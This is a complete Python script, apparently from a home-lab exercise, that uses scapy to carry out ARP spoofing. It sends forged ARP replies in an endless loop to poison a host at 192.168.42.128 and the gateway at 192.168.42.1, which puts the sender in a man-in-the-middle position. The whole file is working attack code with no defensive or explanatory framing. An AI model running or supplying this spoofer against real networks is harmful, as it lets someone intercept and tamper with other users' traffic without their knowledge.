#!usr/bin/env python3
import scapy.all as scapy
import time

def getMac(ip):
    arpRequest = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arpRequestBroadcast = broadcast/arpRequest
    
    answered = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]
    
    return answered[0][1].hwsrc

def spoof(targetIP, spoofIP):
    targetMac = getMac(targetIP)
    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMac, psrc=spoofIP)
    scapy.send(packet, verbose=False)
    
packetsCount = 0    


try:
    while True:
        spoof("192.168.42.128", "192.168.42.1")
        spoof("192.168.42.1", "192.168.42.128")
        
        packetsCount += 2
        print(f"\r[+] Packets sent: {packetsCount}", end="")
        
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[+] Quitting.")